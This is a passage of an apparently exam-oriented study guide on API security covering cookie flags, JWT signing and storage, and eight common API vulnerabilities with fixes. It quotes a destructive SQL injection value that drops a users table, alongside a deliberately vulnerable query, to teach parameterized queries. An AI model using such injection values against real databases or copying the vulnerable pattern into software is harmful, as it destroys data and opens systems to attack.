cookie on same-origin requests. Cross-site navigations (clicking a link from another site) do not include the cookie.\n- **`SameSite=Lax`** — browser sends the cookie on same-origin requests and on top-level navigations (clicking a link), but not on cross-origin subresource requests like XHR or fetch.\n- **`SameSite=None`** — browser sends the cookie on all requests, including cross-origin. Requires `Secure` to also be set; without `Secure`, the browser rejects the `SameSite=None` directive."},{"kind":"p","html":"Use \u003ccode\u003eSameSite=None; Secure\u003c/code\u003e when your client and server run on different origins (for example, a React app on \u003ccode\u003ehttp://localhost\u003c/code\u003e talking to an Express server on \u003ccode\u003ehttp://localhost:3000\u003c/code\u003e).","text":"Use `SameSite=None; Secure` when your client and server run on different origins (for example, a React app on `http://localhost` talking to an Express server on `http://localhost:3000`)."},{"kind":"h3","html":"Max-Age","text":"Max-Age"},{"kind":"p","html":"\u003ccode\u003eMax-Age\u003c/code\u003e sets the cookie lifetime in seconds. \u003ccode\u003eMax-Age=60\u003c/code\u003e expires the cookie 60 seconds after the browser receives it. Setting \u003ccode\u003eMax-Age=0\u003c/code\u003e on logout forces the browser to delete the cookie immediately.","text":"`Max-Age` sets the cookie lifetime in seconds. `Max-Age=60` expires the cookie 60 seconds after the browser receives it. Setting `Max-Age=0` on logout forces the browser to delete the cookie immediately."},{"kind":"h3","html":"Path","text":"Path"},{"kind":"p","html":"\u003ccode\u003ePath=/\u003c/code\u003e makes the cookie available on every route of the origin. Without specifying \u003ccode\u003ePath\u003c/code\u003e, the cookie applies only to the path from which it was set.","text":"`Path=/` makes the cookie available on every route of the origin. Without specifying `Path`, the cookie applies only to the path from which it was set."},{"kind":"h2","html":"The full Set-Cookie header","text":"The full Set-Cookie header"},{"kind":"code","lang":"text","code":"Set-Cookie: token=abc123; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=60"},{"kind":"p","html":"On logout, the server sends a matching header with \u003ccode\u003eMax-Age=0\u003c/code\u003e and an empty value:","text":"On logout, the server sends a matching header with `Max-Age=0` and an empty value:"},{"kind":"code","lang":"text","code":"Set-Cookie: token=; HttpOnly; Path=/; Max-Age=0; SameSite=None; Secure"},{"kind":"p","html":"The attributes must match the original cookie exactly. If any attribute differs, the browser treats it as a different cookie and does not delete the original.","text":"The attributes must match the original cookie exactly. If any attribute differs, the browser treats it as a different cookie and does not delete the original."},{"kind":"h2","html":"withCredentials and cross-origin requests","text":"withCredentials and cross-origin requests"},{"kind":"p","html":"For same-origin requests, the browser sends cookies automatically with no additional configuration. For cross-origin requests, two conditions must both hold:","text":"For same-origin requests, the browser sends cookies automatically with no additional configuration. For cross-origin requests, two conditions must both hold:"},{"kind":"p","html":"\u003col\u003e\n\u003cli\u003eThe client sets \u003ccode\u003ewithCredentials: true\u003c/code\u003e on the XMLHttpRequest (or \u003ccode\u003ecredentials: &#39;include&#39;\u003c/code\u003e on fetch).\u003c/li\u003e\n\u003cli\u003eThe server responds with \u003ccode\u003eAccess-Control-Allow-Credentials: true\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e","text":"1. The client sets `withCredentials: true` on the XMLHttpRequest (or `credentials: 'include'` on fetch).\n2. The server responds with `Access-Control-Allow-Credentials: true`."},{"kind":"p","html":"If withCredentials is false (the default) on a cross-origin request, the browser strips all cookies from the request. The server receives no authentication cookie, cannot identify the user, and returns \u003ccode\u003e401 Unauthorized\u003c/code\u003e.","text":"If withCredentials is false (the default) on a cross-origin request, the browser strips all cookies from the request. The server receives no authentication cookie, cannot identify the user, and returns `401 Unauthorized`."},{"kind":"p","html":"When the client uses withCredentials and the request is non-GET (or non-simple), the browser first sends an OPTIONS preflight request. The server must respond to this preflight with the required \u003ccode\u003eAccess-Control-Allow-*\u003c/code\u003e headers before the browser sends the actual request.","text":"When the client uses withCredentials and the request is non-GET (or non-simple), the browser first sends an OPTIONS preflight request. The server must respond to this preflight with the required `Access-Control-Allow-*` headers before the browser sends the actual request."},{"kind":"checkpoint","q":"A user logs in successfully, but every subsequent `GET /profile` request returns 401. The client makes requests to a different origin and uses XMLHttpRequest. What is the most likely cause?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"The cross-origin XMLHttpRequest is not sending the HttpOnly cookie because `withCredentials` is not set to `true` on the client. By default, cross-origin requests strip all cookies. Setting `withCredentials = true` on the XHR, combined with the server returning `Access-Control-Allow-Credentials: true`, causes the browser to include the cookie.\n\u003c/details\u003e"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eNot using HttpOnly risks ALL of: XSS token theft, session hijacking, AND CSRF — not just XSS. ISAQuiz11 Q3 and Q8 both test this. Selecting only XSS scores zero. When a quiz asks for the risks of omitting HttpOnly (or both HttpOnly and Secure), the correct answer is always &quot;all of the above.&quot; The flags work as a system: HttpOnly prevents JavaScript reads, Secure prevents interception, and SameSite prevents cross-site request forgery.\u003c/p\u003e","text":"Not using HttpOnly risks ALL of: XSS token theft, session hijacking, AND CSRF — not just XSS. ISAQuiz11 Q3 and Q8 both test this. Selecting only XSS scores zero. When a quiz asks for the risks of omitting HttpOnly (or both HttpOnly and Secure), the correct answer is always \"all of the above.\" The flags work as a system: HttpOnly prevents JavaScript reads, Secure prevents interception, and SameSite prevents cross-site request forgery."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e HttpOnly removes the JavaScript attack surface for token theft. Secure restricts transmission to HTTPS. SameSite controls cross-site sending. withCredentials enables cross-origin cookie delivery only when the server also opts in with Access-Control-Allow-Credentials. Logout requires a matching Set-Cookie header with Max-Age=0 — mismatched attributes silently fail to delete the cookie.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":2,"id":"jwt","title":"JWT — structure, signing, and secure storage","hook":"A token you can verify without a database lookup — if you sign it right.","tags":["JWT","json-web-token","signing","secret-key","bcrypt","hashing","XSS"],"module":"API Security","source":"Slide 10, Slide 11, ISAQuiz11","blocks":[{"kind":"p","html":"A server handling thousands of requests per day cannot afford a database lookup on every one just to confirm who the requester is. JSON Web Tokens solve this: the token itself carries proof of identity, and the server verifies it cryptographically — no session store required.","text":"A server handling thousands of requests per day cannot afford a database lookup on every one just to confirm who the requester is. JSON Web Tokens solve this: the token itself carries proof of identity, and the server verifies it cryptographically — no session store required."},{"kind":"h2","html":"The problem: trusting a request without session state","text":"The problem: trusting a request without session state"},{"kind":"p","html":"Every time a client sends a request, the server needs to know who is asking. Traditional session-based auth stores session data on the server. JSON Web Token (JWT) auth removes that requirement — the token itself carries all the information the server needs, and the server verifies it by checking a signature.","text":"Every time a client sends a request, the server needs to know who is asking. Traditional session-based auth stores session data on the server. JSON Web Token (JWT) auth removes that requirement — the token itself carries all the information the server needs, and the server verifies it by checking a signature."},{"kind":"p","html":"No database lookup required. No session table. The server trusts the token because the server signed it.","text":"No database lookup required. No session table. The server trusts the token because the server signed it."},{"kind":"h2","html":"JWT structure","text":"JWT structure"},{"kind":"p","html":"A JWT is three Base64url-encoded strings joined by dots:","text":"A JWT is three Base64url-encoded strings joined by dots:"},{"kind":"code","lang":"text","code":"base64url(header).base64url(payload).base64url(signature)"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003ePart\u003c/th\u003e\n\u003cth\u003eContains\u003c/th\u003e\n\u003cth\u003eExample fields\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eHeader\u003c/td\u003e\n\u003ctd\u003eAlgorithm and token type\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e{ &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot; }\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePayload\u003c/td\u003e\n\u003ctd\u003eClaims about the user\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e{ &quot;username&quot;: &quot;admin&quot;, &quot;exp&quot;: 1234567890 }\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eSignature\u003c/td\u003e\n\u003ctd\u003eHMAC of header + payload using the secret key\u003c/td\u003e\n\u003ctd\u003ecomputed by the server\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"The payload is readable by anyone who has the token. The signature is what prevents tampering.","text":"The payload is readable by anyone who has the token. The signature is what prevents tampering."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eThe three parts of a JWT are header, payload, and signature — NOT header, payload, and certificate. NOT header, body, and footer. ISAQuiz11 Q5 distractors use both wrong terms. Certificate and Body are not JWT concepts.\u003c/p\u003e","text":"The three parts of a JWT are header, payload, and signature — NOT header, payload, and certificate. NOT header, body, and footer. ISAQuiz11 Q5 distractors use both wrong terms. Certificate and Body are not JWT concepts."},{"kind":"h2","html":"How signing works","text":"How signing works"},{"kind":"p","html":"When the server signs a token, it runs HS256 (a keyed HMAC function) over the concatenated header and payload using the secret key. That produces the signature. The server appends it and sends the full token to the client.","text":"When the server signs a token, it runs HS256 (a keyed HMAC function) over the concatenated header and payload using the secret key. That produces the signature. The server appends it and sends the full token to the client."},{"kind":"p","html":"When the server later receives the token back, it recomputes the signature from the header and payload it received. If the recomputed signature matches the one in the token, nothing was altered. If they differ, the token was tampered with and the server rejects it.","text":"When the server later receives the token back, it recomputes the signature from the header and payload it received. If the recomputed signature matches the one in the token, nothing was altered. If they differ, the token was tampered with and the server rejects it."},{"kind":"p","html":"This is why signing guarantees authenticity: only the server that holds the secret key can produce a valid signature.","text":"This is why signing guarantees authenticity: only the server that holds the secret key can produce a valid signature."},{"kind":"h2","html":"The login flow","text":"The login flow"},{"kind":"p","html":"\u003col\u003e\n\u003cli\u003eThe client sends credentials (email and password) to the server.\u003c/li\u003e\n\u003cli\u003eThe server validates the credentials. Never store plain-text passwords — always store a bcrypt hash.\u003c/li\u003e\n\u003cli\u003eOn success, the server signs a token:\u003c/li\u003e\n\u003c/ol\u003e","text":"1. The client sends credentials (email and password) to the server.\n2. The server validates the credentials. Never store plain-text passwords — always store a bcrypt hash.\n3. On success, the server signs a token:"},{"kind":"code","lang":"js","code":"const token = jwt.sign({ username }, TOKEN_SECRET, {\n  algorithm: 'HS256',\n  expiresIn: '120s',\n});"},{"kind":"p","html":"\u003col start=\"4\"\u003e\n\u003cli\u003eThe server sets the token in an HttpOnly cookie and sends it to the client:\u003c/li\u003e\n\u003c/ol\u003e","text":"4. The server sets the token in an HttpOnly cookie and sends it to the client:"},{"kind":"code","lang":"js","code":"res.setHeader(\n  'Set-Cookie',\n  `token=${token}; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=120`\n);"},{"kind":"p","html":"\u003col start=\"5\"\u003e\n\u003cli\u003eThe client&#39;s browser attaches the cookie automatically on every subsequent request.\u003c/li\u003e\n\u003cli\u003eThe server calls \u003ccode\u003ejwt.verify(token, TOKEN_SECRET)\u003c/code\u003e on each protected route to authenticate the request.\u003c/li\u003e\n\u003c/ol\u003e","text":"5. The client's browser attaches the cookie automatically on every subsequent request.\n6. The server calls `jwt.verify(token, TOKEN_SECRET)` on each protected route to authenticate the request."},{"kind":"p","html":"Short expiration times (e.g., \u003ccode\u003e120s\u003c/code\u003e) limit how long a stolen token remains useful.","text":"Short expiration times (e.g., `120s`) limit how long a stolen token remains useful."},{"kind":"h2","html":"JWT storage: HttpOnly cookies vs localStorage","text":"JWT storage: HttpOnly cookies vs localStorage"},{"kind":"p","html":"Storing a JWT in \u003ccode\u003elocalStorage\u003c/code\u003e makes it readable by any JavaScript running on the page — including injected scripts from a Cross-Site Scripting (XSS) attack. A successful XSS attack against \u003ccode\u003elocalStorage\u003c/code\u003e lets an attacker steal the token and impersonate the user.","text":"Storing a JWT in `localStorage` makes it readable by any JavaScript running on the page — including injected scripts from a Cross-Site Scripting (XSS) attack. A successful XSS attack against `localStorage` lets an attacker steal the token and impersonate the user."},{"kind":"p","html":"An HttpOnly cookie cannot be read by JavaScript. The browser sends it automatically but the page script never sees the value. That blocks the most common XSS-based token theft vector.","text":"An HttpOnly cookie cannot be read by JavaScript. The browser sends it automatically but the page script never sees the value. That blocks the most common XSS-based token theft vector."},{"kind":"p","html":"Cookie attribute summary:","text":"Cookie attribute summary:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eAttribute\u003c/th\u003e\n\u003cth\u003eEffect\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eHttpOnly\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eJavaScript cannot access the cookie\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eSecure\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eCookie is sent only over HTTPS\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eSameSite\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePrevents the browser from sending the cookie on cross-site requests, mitigating CSRF\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eOmitting both \u003ccode\u003eHttpOnly\u003c/code\u003e and \u003ccode\u003eSecure\u003c/code\u003e on the JWT cookie exposes the token to XSS attacks, CSRF attacks, and unauthorized access — all three, not just XSS. ISAQuiz11 Q8 requires selecting &quot;All of the above.&quot; Selecting only &quot;XSS&quot; scores zero.\u003c/p\u003e","text":"Omitting both `HttpOnly` and `Secure` on the JWT cookie exposes the token to XSS attacks, CSRF attacks, and unauthorized access — all three, not just XSS. ISAQuiz11 Q8 requires selecting \"All of the above.\" Selecting only \"XSS\" scores zero."},{"kind":"h2","html":"Secret key storage","text":"Secret key storage"},{"kind":"p","html":"The secret key must stay out of source code. Store it in an environment variable and read it at runtime:","text":"The secret key must stay out of source code. Store it in an environment variable and read it at runtime:"},{"kind":"code","lang":"js","code":"const TOKEN_SECRET = process.env.TOKEN_SECRET;"},{"kind":"p","html":"A long, randomly generated key (e.g., 64 random bytes expressed as hex) is significantly harder to brute-force than a short string like \u003ccode\u003e&#39;shhhhh!&#39;\u003c/code\u003e. Generate one with:","text":"A long, randomly generated key (e.g., 64 random bytes expressed as hex) is significantly harder to brute-force than a short string like `'shhhhh!'`. Generate one with:"},{"kind":"code","lang":"js","code":"require('crypto').randomBytes(64).toString('hex')"},{"kind":"checkpoint","q":"Where is the safe place to store a JWT secret key on the server?","a":"In an environment variable. Never commit it to source control or hardcode it in the application."},{"kind":"h2","html":"Takeaway","text":"Takeaway"},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e JWT lets a server authenticate every request without storing session state — but only if you sign with a long secret key stored in an environment variable, set a short expiration, and deliver the token exclusively via an HttpOnly, Secure cookie. Cutting corners on any of those three properties opens a distinct attack vector.","text":"**Takeaway:** JWT lets a server authenticate every request without storing session state — but only if you sign with a long secret key stored in an environment variable, set a short expiration, and deliver the token exclusively via an HttpOnly, Secure cookie. Cutting corners on any of those three properties opens a distinct attack vector."}]},{"n":3,"id":"api-security-best-practices","title":"Top 8 API security vulnerabilities and how to prevent them","hook":"One unsanitized input field can give an attacker access to your entire database — here are the eight patterns to close.","tags":["security","SQL-injection","rate-limiting","OWASP","mass-assignment","XSS","CSRF","DoS"],"module":"API Security","source":"Slide 12, ISAQuiz12","blocks":[{"kind":"p","html":"An attacker submits \u003ccode\u003e&#39; WHERE 1=1; DROP TABLE users; --\u003c/code\u003e as their email address. Your Express route builds the query with a template literal: the injected string becomes valid SQL and your entire users table is gone. That single unsanitized input field was the entry point. Each of the eight vulnerabilities below has an equally concrete entry point — and an equally concrete fix.","text":"An attacker submits `' WHERE 1=1; DROP TABLE users; --` as their email address. Your Express route builds the query with a template literal: the injected string becomes valid SQL and your entire users table is gone. That single unsanitized input field was the entry point. Each of the eight vulnerabilities below has an equally concrete entry point — and an equally concrete fix."},{"kind":"h2","html":"1. Broken User Authentication","text":"1. Broken User Authentication"},{"kind":"p","html":"Weak passwords, absent session timeouts, and improper token handling let attackers pose as legitimate users. A server that reuses expired tokens or sets no session expiry keeps valid sessions alive indefinitely. Credential recovery and forgot-password endpoints are full login vectors — they need the same protections.","text":"Weak passwords, absent session timeouts, and improper token handling let attackers pose as legitimate users. A server that reuses expired tokens or sets no session expiry keeps valid sessions alive indefinitely. Credential recovery and forgot-password endpoints are full login vectors — they need the same protections."},{"kind":"p","html":"\u003cstrong\u003ePrevention:\u003c/strong\u003e Require strong passwords and enforce multi-factor authentication (MFA). Set session timeouts. Rate-limit and lock accounts after repeated failures. Store passwords with a strong hashing algorithm such as bcrypt, never in plain text.","text":"**Prevention:** Require strong passwords and enforce multi-factor authentication (MFA). Set session timeouts. Rate-limit and lock accounts after repeated failures. Store passwords with a strong hashing algorithm such as bcrypt, never in plain text."},{"kind":"code","lang":"js","code":"// Rate-limit by IP before processing login\nif (loginAttempts[ip] \u003e= 3) {\n  return res.status(429).json({ message: 'Too many login attempts. Try again later.' });\n}"},{"kind":"checkpoint","q":"Which measure specifically protects against brute force attacks on a login endpoint?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"Temporarily locking out the account (or the IP) after multiple unsuccessful login attempts. Rate limiting and lockout force an attacker to slow down exponentially — they cannot run thousands of password guesses per second. MFA adds a second factor so a guessed password alone is insufficient. ISAQuiz12 Q8 confirmed account lockout; Q4 confirmed rate limiting's purpose is brute force mitigation.\n\u003c/details\u003e"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eStoring sensitive information in plain text inside a cookie is a vulnerability regardless of whether the \u003ccode\u003eHttpOnly\u003c/code\u003e and \u003ccode\u003eSecure\u003c/code\u003e flags are set. Those flags restrict JavaScript access and HTTPS-only transmission — they do not encrypt or protect the value itself. ISAQuiz12 Q6 confirmed this: &quot;storing sensitive information in plain text within a cookie while employing the \u003ccode\u003eSecure\u003c/code\u003e and \u003ccode\u003eHttpOnly\u003c/code\u003e attributes&quot; does NOT help with preventing Broken User Authentication.\u003c/p\u003e","text":"Storing sensitive information in plain text inside a cookie is a vulnerability regardless of whether the `HttpOnly` and `Secure` flags are set. Those flags restrict JavaScript access and HTTPS-only transmission — they do not encrypt or protect the value itself. ISAQuiz12 Q6 confirmed this: \"storing sensitive information in plain text within a cookie while employing the `Secure` and `HttpOnly` attributes\" does NOT help with preventing Broken User Authentication."},{"kind":"h2","html":"2. Excessive Data Exposure","text":"2. Excessive Data Exposure"},{"kind":"p","html":"An API accidentally returns more data than the client needs — a full user record including SSN when only name and email were requested, or a detailed error message exposing the database schema. Filtering at the client side is not a defense: the full payload already left the server.","text":"An API accidentally returns more data than the client needs — a full user record including SSN when only name and email were requested, or a detailed error message exposing the database schema. Filtering at the client side is not a defense: the full payload already left the server."},{"kind":"p","html":"\u003cstrong\u003ePrevention:\u003c/strong\u003e Filter the response payload on the server before sending it. Never pass raw model objects through \u003ccode\u003eto_json()\u003c/code\u003e or \u003ccode\u003etoString()\u003c/code\u003e — cherry-pick specific fields. Encrypt sensitive data at rest and in transit. Return generic error messages to the client.","text":"**Prevention:** Filter the response payload on the server before sending it. Never pass raw model objects through `to_json()` or `toString()` — cherry-pick specific fields. Encrypt sensitive data at rest and in transit. Return generic error messages to the client."},{"kind":"code","lang":"js","code":"// WRONG — returns the entire user object\nres.json(user);\n\n// RIGHT — return only what the client needs\nres.json({ name: user.name, email: user.email });"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eISAQuiz12 Q3 asked which option is NOT an example of Excessive Data Exposure. The trap answer was &quot;filtering out and removing unnecessary details from Error Messages before displaying them to users.&quot; That is the PREVENTION, not an example of the vulnerability. Confusing the prevention with an example of the problem is the exact mistake the exam tests.\u003c/p\u003e","text":"ISAQuiz12 Q3 asked which option is NOT an example of Excessive Data Exposure. The trap answer was \"filtering out and removing unnecessary details from Error Messages before displaying them to users.\" That is the PREVENTION, not an example of the vulnerability. Confusing the prevention with an example of the problem is the exact mistake the exam tests."},{"kind":"checkpoint","q":"An API endpoint returns all student grades and relies on the client app to hide irrelevant ones. Is this Excessive Data Exposure?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"Yes. Client-side filtering does not protect data — the full payload travels over the network and is visible to anyone who inspects the response. The server must filter before sending.\n\u003c/details\u003e"},{"kind":"h2","html":"3. Lack of Resources / Rate Limiting","text":"3. Lack of Resources / Rate Limiting"},{"kind":"p","html":"A server with no request limits lets a single client send thousands of requests per second. This exhausts memory, CPU, and file handles, making the service unavailable to legitimate users. Attackers bypass per-IP limits by spreading requests across multiple IP addresses or user accounts.","text":"A server with no request limits lets a single client send thousands of requests per second. This exhausts memory, CPU, and file handles, making the service unavailable to legitimate users. Attackers bypass per-IP limits by spreading requests across multiple IP addresses or user accounts."},{"kind":"p","html":"\u003cstrong\u003ePrevention:\u003c/strong\u003e Apply rate limiting at multiple levels — IP address, user account, and application. Use libraries such as \u003ccode\u003eexpress-rate-limit\u003c/code\u003e. Validate request payloads to reject oversized bodies before processing begins.","text":"**Prevention:** Apply rate limiting at multiple levels — IP address, user account, and application. Use libraries such as `express-rate-limit`. Validate request payloads to reject oversized bodies before processing begins."},{"kind":"code","lang":"js","code":"const rateLimit = require('express-rate-limit');\n\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100,                  // limit each IP to 100 requests per window\n  message: 'Too many requests from this IP, please try again later.'\n});\n\napp.use('/api/', limiter);"},{"kind":"h2","html":"4. Broken Function Level Authorization","text":"4. Broken Function Level Authorization"},{"kind":"p","html":"An attacker calls a privileged function — such as \u003ccode\u003edelete_course()\u003c/code\u003e — because the server never checks whether the caller has admin rights. The route exists and is reachable; authorization is simply missing.","text":"An attacker calls a privileged function — such as `delete_course()` — because the server never checks whether the caller has admin rights. The route exists and is reachable; authorization is simply missing."},{"kind":"p","html":"\u003cstrong\u003ePrevention:\u003c/strong\u003e Check the caller&#39;s role before executing any privileged function. Never expose admin-only routes without server-side role verification. Supplement with penetration testing and vulnerability scanners to find unchecked routes.","text":"**Prevention:** Check the caller's role before executing any privileged function. Never expose admin-only routes without server-side role verification. Supplement with penetration testing and vulnerability scanners to find unchecked routes."},{"kind":"code","lang":"js","code":"if (req.user.role !== 'admin') {\n  return res.status(403).send('You are not authorized to perform this action');\n}"},{"kind":"h2","html":"5. Broken Object-Level Authorization (BOLA)","text":"5. Broken Object-Level Authorization (BOLA)"},{"kind":"p","html":"A student editing their own profile sends \u003ccode\u003ePUT /api/users/42/edit-profile\u003c/code\u003e. Nothing stops them from changing \u003ccode\u003e42\u003c/code\u003e to \u003ccode\u003e99\u003c/code\u003e and editing another user&#39;s profile. The server validates that the user is authenticated but never checks whether the authenticated user owns object \u003ccode\u003e99\u003c/code\u003e.","text":"A student editing their own profile sends `PUT /api/users/42/edit-profile`. Nothing stops them from changing `42` to `99` and editing another user's profile. The server validates that the user is authenticated but never checks whether the authenticated user owns object `99`."},{"kind":"p","html":"\u003cstrong\u003ePrevention:\u003c/strong\u003e Use a multi-layered approach: Role-Based Access Control (RBAC) for function-level checks, combined with object-level Access Control Lists (ACLs) to verify ownership. Fine-grained controls at the object level catch the cases that role checks miss.","text":"**Prevention:** Use a multi-layered approach: Role-Based Access Control (RBAC) for function-level checks, combined with object-level Access Control Lists (ACLs) to verify ownership. Fine-grained controls at the object level catch the cases that role checks miss."},{"kind":"checkpoint","q":"ISAQuiz12 Q10 shows an Express route `PUT /update-profile/:userId` guarded by `isResourceOwner` middleware. What vulnerability does a bug in `isResourceOwner` expose?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"Broken Object-Level Authorization (BOLA). If `isResourceOwner` does not correctly verify that the authenticated user owns the requested `userId`, other users can modify profiles they do not own. ISAQuiz12 Q7 showed the same pattern with a hardcoded owner ID — the function always returned `'user123'` instead of checking the actual resource owner.\n\u003c/details\u003e"},{"kind":"h2","html":"6. Mass Assignment","text":"6. Mass Assignment"},{"kind":"p","html":"A user model has \u003ccode\u003ename\u003c/code\u003e, \u003ccode\u003eemail\u003c/code\u003e, and \u003ccode\u003epassword\u003c/code\u003e fields. If the API passes \u003ccode\u003ereq.body\u003c/code\u003e directly to the model, an attacker adds \u003ccode\u003e&quot;isAdmin&quot;: true\u003c/code\u003e to the request body and elevates their own privileges. The vulnerability is that the API trusts the client to send only the fields it should control.","text":"A user model has `name`, `email`, and `password` fields. If the API passes `req.body` directly to the model, an attacker adds `\"isAdmin\": true` to the request body and elevates their own privileges. The vulnerability is that the API trusts the client to send only the fields it should control."},{"kind":"p","html":"\u003cstrong\u003ePrevention:\u003c/strong\u003e Never pass the raw request body to a model. Whitelist the specific properties you accept. Use input validation libraries to strip or reject unexpected keys.","text":"**Prevention:** Never pass the raw request body to a model. Whitelist the specific properties you accept. Use input validation libraries to strip or reject unexpected keys."},{"kind":"code","lang":"js","code":"// WRONG — attacker can inject isAdmin, isBanned, etc.\nconst user = await User.update(req.body);\n\n// RIGHT — only accept expected fields\nconst { name, email } = req.body;\nconst user = await User.update({ name, email });"},{"kind":"h2","html":"7. Security Misconfiguration","text":"7. Security Misconfiguration"},{"kind":"p","html":"Default passwords left on database management systems, secret keys hardcoded in source code, and detailed error stacks sent to clients all count as security misconfigurations. A hardcoded JWT secret key exposed in source control gives any attacker the ability to forge tokens.","text":"Default passwords left on database management systems, secret keys hardcoded in source code, and detailed error stacks sent to clients all count as security misconfigurations. A hardcoded JWT secret key exposed in source control gives any attacker the ability to forge tokens."},{"kind":"p","html":"\u003cstrong\u003ePrevention:\u003c/strong\u003e Disable unnecessary services and features. Store secrets in environment variables, not in source code. Return generic error messages to clients — log details server-side only.","text":"**Prevention:** Disable unnecessary services and features. Store secrets in environment variables, not in source code. Return generic error messages to clients — log details server-side only."},{"kind":"code","lang":"js","code":"// WRONG — secret is hardcoded and visible in source\njwt.verify(token, 'secretkey', (err, decoded) =\u003e { ... });\n\n// RIGHT — load from environment variable\njwt.verify(token, process.env.JWT_SECRET, (err, decoded) =\u003e { ... });"},{"kind":"h2","html":"8. Injection (SQL, NoSQL, Command)","text":"8. Injection (SQL, NoSQL, Command)"},{"kind":"p","html":"Untrusted user input is concatenated directly into a SQL query, NoSQL query, or shell command. The database or shell executes the injected payload as a command, not as a data value. An attacker sets \u003ccode\u003enewEmail\u003c/code\u003e to \u003ccode\u003e&#39; WHERE 1=1; DROP TABLE users; --\u003c/code\u003e and the server deletes the table.","text":"Untrusted user input is concatenated directly into a SQL query, NoSQL query, or shell command. The database or shell executes the injected payload as a command, not as a data value. An attacker sets `newEmail` to `' WHERE 1=1; DROP TABLE users; --` and the server deletes the table."},{"kind":"p","html":"\u003cstrong\u003ePrevention:\u003c/strong\u003e Use parameterized queries. The \u003ccode\u003e?\u003c/code\u003e placeholder tells the database driver to treat the substituted value as a data string — SQL syntax in the value is never interpreted as SQL.","text":"**Prevention:** Use parameterized queries. The `?` placeholder tells the database driver to treat the substituted value as a data string — SQL syntax in the value is never interpreted as SQL."},{"kind":"code","lang":"js","code":"// VULNERABLE — template literal embeds user input directly into SQL\nconst query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;\nconst result = database.query(query);\n\n// SAFE — parameterized query: values passed separately\nconst query = 'UPDATE users SET email=? WHERE id=?';\nconst result = database.query(query, [newEmail, userId]);"},{"kind":"checkpoint","q":"Which of these prevents SQL injection: using `.replace()` to strip quotes from user input, or using `?` placeholders with a separate values array?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"Parameterized queries (`?` placeholders). The `.replace()` approach strips single quotes but fails against other characters, hex encodings, and multi-byte sequences that attackers use to bypass string sanitization. The database driver with parameterized queries treats the entire substituted value as a data literal — SQL syntax in the value never executes. ISAQuiz12 Q2 confirmed this directly.\n\u003c/details\u003e"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003e.replace()\u003c/code\u003e is NOT a SQL injection fix. It is bypassable with other character encodings and attack vectors that do not rely on single quotes. Only parameterized queries with \u003ccode\u003e?\u003c/code\u003e placeholders actually prevent injection, because the database driver separates SQL structure from data at the protocol level. Source: ISAQuiz12 Q2, exam-strategy Pitfall 5.\u003c/p\u003e","text":"`.replace()` is NOT a SQL injection fix. It is bypassable with other character encodings and attack vectors that do not rely on single quotes. Only parameterized queries with `?` placeholders actually prevent injection, because the database driver separates SQL structure from data at the protocol level. Source: ISAQuiz12 Q2, exam-strategy Pitfall 5."},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e Each of the eight vulnerabilities has a predictable entry point: trust the client, skip a check, or expose too much. The fixes follow a pattern — validate and filter input, check authorization at both function and object level, use parameterized queries, store secrets in environment variables, and rate-limit credential endpoints. Parameterized queries and object-level authorization checks appear on exams repeatedly because they are the most commonly missed.","text":"**Takeaway:** Each of the eight vulnerabilities has a predictable entry point: trust the client, skip a check, or expose too much. The fixes follow a pattern — validate and filter input, check authorization at both function and object level, use parameterized queries, store secrets in environment variables, and rate-limit credential endpoints. Parameterized queries and object-level authorization checks appear on exams repeatedly because they are the most commonly missed."}]},{"n":4,"id":"public-private-keys","title":"Symmetric and asymmetric encryption — key exchange and signing","hook":"You want to send a secret to Tom over a public network — but you've never met to share a key. Here's how to do it anyway.","tags":["asymmetric","symmetric","public-key","private-key","RSA","signing"],"module":"API Security","source":"Slide 9, Slide 10, ISAQuiz11","blocks":[{"kind":"p","html":"Tom wants to receive 